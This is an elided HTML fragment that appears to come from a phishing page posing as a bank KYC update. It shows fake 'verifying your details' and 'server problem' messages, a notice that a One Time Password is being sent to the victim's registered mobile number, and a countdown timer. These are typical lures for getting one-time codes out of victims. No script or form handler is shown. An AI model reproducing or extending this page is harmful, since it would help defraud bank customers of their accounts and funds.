...
<meta name="theme-color" content="#ffffff">
    ...
    <img src="first.jpg" alt=""width="100%" ><br><br>
    ...
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verify your details... </h4></center>

<center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Your request for KYC updating is not process....try again. </h4></center>


<center><h4 style="color:red; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Fetching some server problem. </h4></center>
   ...
   <center><b style="color:#7212b3; margin:0px;">We sending One Time Password on your registered mobile number.</b></center>
    ...
    <b style="color:grey; font-size:15px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</b>
       ...
       <br><br><br>
             <img src="fourth.jpg" alt="" width="100%" id="mm">